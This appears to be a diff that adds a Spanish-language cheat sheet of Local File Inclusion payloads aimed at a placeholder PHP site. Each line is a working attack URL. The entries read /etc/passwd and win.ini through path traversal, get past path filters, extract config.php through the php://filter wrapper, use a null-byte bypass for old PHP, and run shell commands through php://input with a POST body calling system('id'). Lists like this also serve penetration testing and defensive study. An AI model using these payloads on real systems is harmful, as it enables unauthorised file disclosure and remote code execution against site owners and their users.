@@ -1,0 +1,17 @@
+▶ Lectura de Archivos del Sistema (Acceder a archivos locales):
+  http://ejemplo.com/index.php?page=../../../etc/passwd
+
+▶ Evasión de Filtros (Evadir restricciones de ruta):
+  http://ejemplo.com/index.php?page=....//....//....//etc/passwd
+
+▶ Uso de Wrappers (Leer codificado en Base64):
+  http://ejemplo.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+
+▶ Uso de Null Byte (Bypass en PHP < 5.3.4):
+  http://ejemplo.com/index.php?page=../../../etc/passwd%00
+
+▶ LFI en Windows (Acceder a archivos de Windows):
+  http://ejemplo.com/index.php?page=../../../windows/win.ini
+
+▶ LFI con POST (Inyectar código vía POST):
+  http://ejemplo.com/index.php?page=php://input  # POST: <?php system('id'); ?>
